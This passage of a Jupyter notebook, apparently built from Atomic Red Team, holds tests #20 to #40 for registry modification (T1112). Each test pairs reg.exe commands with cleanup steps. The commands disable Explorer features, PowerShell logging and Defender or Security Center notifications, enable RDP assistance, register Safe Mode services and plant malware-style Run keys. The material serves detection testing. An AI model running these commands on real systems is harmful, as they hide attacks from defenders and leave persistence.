    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoControlPanel /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "97106600",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 20"
  },
  {
   "cell_type": "markdown",
   "id": "6adc0b39",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoControlPanel /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "522beeda",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 20 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "03e79f1c",
   "metadata": {},
   "source": [
    "### Atomic Test #21 - Activate Windows NoFileMenu Group Policy Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove File menu from Windows Explorer Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFileMenu /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "77949791",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 21"
  },
  {
   "cell_type": "markdown",
   "id": "e836aa08",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFileMenu /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b6a4b146",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 21 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "dd917f13",
   "metadata": {},
   "source": [
    "### Atomic Test #22 - Activate Windows NoClose Group Policy Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable and remove the Shut Down command Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoClose /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7c433b81",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 22"
  },
  {
   "cell_type": "markdown",
   "id": "9f8882d9",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoClose /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "55e360aa",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 22 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "fbf655bb",
   "metadata": {},
   "source": [
    "### Atomic Test #23 - Activate Windows NoSetTaskbar Group Policy Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable changes to Taskbar and Start Menu Settings Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoSetTaskbar /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8afc96fb",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 23"
  },
  {
   "cell_type": "markdown",
   "id": "ea3580b4",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoSetTaskbar /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ab775792",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 23 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "833bc47e",
   "metadata": {},
   "source": [
    "### Atomic Test #24 - Activate Windows NoTrayContextMenu Group Policy Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable context menu for taskbar Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoTrayContextMenu /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f26dc95c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 24"
  },
  {
   "cell_type": "markdown",
   "id": "c07a463f",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoTrayContextMenu /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9b14ae4a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 24 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "a70cc907",
   "metadata": {},
   "source": [
    "### Atomic Test #25 - Activate Windows NoPropertiesMyDocuments Group Policy Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to hide Properties from \"My Documents icon\" Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoPropertiesMyDocuments /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9134ad7c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 25"
  },
  {
   "cell_type": "markdown",
   "id": "7b4a35c6",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoPropertiesMyDocuments /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7feee133",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 25 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "413aabb9",
   "metadata": {},
   "source": [
    "### Atomic Test #26 - Hide Windows Clock Group Policy Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to Hide Clock Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideClock /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c28bf248",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 26"
  },
  {
   "cell_type": "markdown",
   "id": "81f1a605",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideClock /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3eecf020",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 26 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "c8abb7f7",
   "metadata": {},
   "source": [
    "### Atomic Test #27 - Windows HideSCAHealth Group Policy Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to remove security and maintenance icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAHealth /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1299a3cb",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 27"
  },
  {
   "cell_type": "markdown",
   "id": "039dfd7d",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAHealth /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dcf6ab6a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 27 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "f680de3b",
   "metadata": {},
   "source": [
    "### Atomic Test #28 - Windows HideSCANetwork Group Policy Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the networking icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCANetwork /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4c655609",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 28"
  },
  {
   "cell_type": "markdown",
   "id": "96e89b51",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCANetwork /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a97acb39",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 28 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "7512b444",
   "metadata": {},
   "source": [
    "### Atomic Test #29 - Windows HideSCAPower Group Policy Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the battery icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAPower /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1407ced0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 29"
  },
  {
   "cell_type": "markdown",
   "id": "9e295465",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAPower /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a9cb20e2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 29 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "bc76338b",
   "metadata": {},
   "source": [
    "### Atomic Test #30 - Windows HideSCAVolume Group Policy Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the volume icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect..\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAVolume /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "81dd02e4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 30"
  },
  {
   "cell_type": "markdown",
   "id": "9f773864",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAVolume /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "378b7caa",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 30 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "e3a6fffc",
   "metadata": {},
   "source": [
    "### Atomic Test #31 - Windows Modify Show Compress Color And Info Tip Registry",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to show compress color and show tips feature. \nSee how hermeticwiper uses this technique - https://www.splunk.com/en_us/blog/security/detecting-hermeticwiper.html\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowCompColor /t REG_DWORD /d 0 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7fef064f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 31"
  },
  {
   "cell_type": "markdown",
   "id": "c0c16be3",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowInfoTip /f >nul 2>&1\nreg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowCompColor /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "325bd92b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 31 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "1ebe9938",
   "metadata": {},
   "source": [
    "### Atomic Test #32 - Windows Powershell Logging Disabled",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to disable Powershell Module Logging, Script Block Logging, Transcription and Script Execution\nsee https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.PowerShell::EnableModuleLogging\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription /v EnableTranscripting /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell /v EnableScripts /t REG_DWORD /d 0 /f\nREM do a little cleanup immediately to avoid execution issues with later tests\nreg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell /v EnableScripts /f >nul 2>&1\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e0ae5ca3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 32"
  },
  {
   "cell_type": "markdown",
   "id": "24a8da0e",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging /v EnableModuleLogging /f >nul 2>&1\nreg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging /v EnableScriptBlockLogging /f >nul 2>&1\nreg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription /v EnableTranscripting /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "078a5b04",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 32 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "4b87d630",
   "metadata": {},
   "source": [
    "### Atomic Test #33 - Windows Add Registry Value to Load Service in Safe Mode without Network",
    "Modify the registry to allow a driver, service, to persist in Safe Mode.\nsee https://redcanary.com/blog/tracking-driver-inventory-to-expose-rootkits/ and https://blog.didierstevens.com/2007/03/26/playing-with-safe-mode/ for further details.\nAdding a subkey to Minimal with the name of your service and a default value set to Service, makes that your service will be started when you boot into Safe Mode without networking. The same applies for the Network subkey.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\AtomicSafeMode\" /VE /T REG_SZ /F /D \"Service\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "433b2202",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 33"
  },
  {
   "cell_type": "markdown",
   "id": "b4f12678",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\AtomicSafeMode\" /f\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "db66bc30",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 33 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "703e5f59",
   "metadata": {},
   "source": [
    "### Atomic Test #34 - Windows Add Registry Value to Load Service in Safe Mode with Network",
    "Modify the registry to allow a driver, service, to persist in Safe Mode with networking.\nsee https://redcanary.com/blog/tracking-driver-inventory-to-expose-rootkits/ and https://blog.didierstevens.com/2007/03/26/playing-with-safe-mode/ for further details.\nAdding a subkey to Netowrk with the name of your service and a default value set to Service, makes that your service will be started when you boot into Safe Mode with networking.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\AtomicSafeMode\" /VE /T REG_SZ /F /D \"Service\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d8a98b4a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 34"
  },
  {
   "cell_type": "markdown",
   "id": "a35462c6",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\AtomicSafeMode\" /f\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "30882ce9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 34 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "ce556a5d",
   "metadata": {},
   "source": [
    "### Atomic Test #35 - Disable Windows Toast Notifications",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows toast notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7e10e51d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 35"
  },
  {
   "cell_type": "markdown",
   "id": "fc10e8b4",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PushNotifications /v ToastEnabled /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "afb5bf6c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 35 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "f07ede84",
   "metadata": {},
   "source": [
    "### Atomic Test #36 - Disable Windows Security Center Notifications",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows security center notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "26bc3ef3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 36"
  },
  {
   "cell_type": "markdown",
   "id": "89a9ae7b",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell /v UseActionCenterExperience /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "509b7a79",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 36 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "f100f96f",
   "metadata": {},
   "source": [
    "### Atomic Test #37 - Suppress Win Defender Notifications",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to suppress the windows defender notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration\" /v Notification_Suppress /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "365f2da7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 37"
  },
  {
   "cell_type": "markdown",
   "id": "9a379255",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration\" /v Notification_Suppress /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d0a40166",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 37 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "a4e66200",
   "metadata": {},
   "source": [
    "### Atomic Test #38 - Allow RDP Remote Assistance Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to allow rdp remote assistance feature. This feature allow specific\nuser to rdp connect on the targeted machine.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "98cdb8ab",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 38"
  },
  {
   "cell_type": "markdown",
   "id": "0eac3756",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9e3fb8a9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 38 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "6041db77",
   "metadata": {},
   "source": [
    "### Atomic Test #39 - NetWire RAT Registry Key Creation",
    "NetWire continues to create its home key (HKCU\\SOFTWARE\\NetWire) as well as adding it into the auto-run group in the victim\u2019s registry.\nSee how NetWire malware - https://app.any.run/tasks/41ecdbde-4997-4301-a350-0270448b4c8f/\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NetWire /t REG_SZ  /d \"C:\\Users\\admin\\AppData\\Roaming\\Install\\Host.exe\" /f\nreg add HKCU\\SOFTWARE\\NetWire /v HostId /t REG_SZ /d HostId-kai6Ci /f\nreg add HKCU\\SOFTWARE\\NetWire /v \"Install Date\" /t REG_SZ /d \"2021-08-30 07:17:27\" /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "26e2c057",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 39"
  },
  {
   "cell_type": "markdown",
   "id": "02b77681",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NetWire /f >nul 2>&1\nreg delete HKCU\\SOFTWARE\\NetWire /va /f >nul 2>&1\nreg delete HKCU\\SOFTWARE\\NetWire /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b9b1b980",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 39 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "f71852cb",
   "metadata": {},
   "source": [
    "### Atomic Test #40 - Ursnif Malware Registry Key Creation",
    "Ursnif downloads additional modules from the C&C server and saves these in the registry folder HKEY_CURRENT_USER\\Software\\AppDataLow\\Software\\Microsoft\\\nMore information - https://blog.trendmicro.com/trendlabs-security-intelligence/phishing-campaign-uses-hijacked-emails-to-deliver-ursnif-by-replying-to-ongoing-threads/\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /v comsxRes /t REG_BINARY  /d 72656463616e617279 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8422e021",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 40"
  },
  {
   "cell_type": "markdown",
   "id": "3eb4183e",
   "metadata": {},
